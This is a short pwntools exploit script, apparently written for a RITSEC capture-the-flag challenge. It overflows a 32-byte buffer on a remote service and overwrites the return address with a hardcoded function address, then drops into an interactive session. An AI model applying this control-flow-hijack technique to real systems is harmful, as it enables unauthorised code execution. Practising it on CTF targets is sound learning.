from pwn import *

context.log_level = "debug"

binfile = './test_gumponent'
offset = b'\x02'*32
rhost = 'ctf.ritsec.club'
rport = 31746

elf = ELF(binfile)
context.binary = elf

p = remote(rhost, rport)
p.recvuntil('function is at ')
p.recvuntil("\n")

gofunc = 0x401230

payload = offset
payload += pack(gofunc)

p.sendline(payload)
p.interactive()
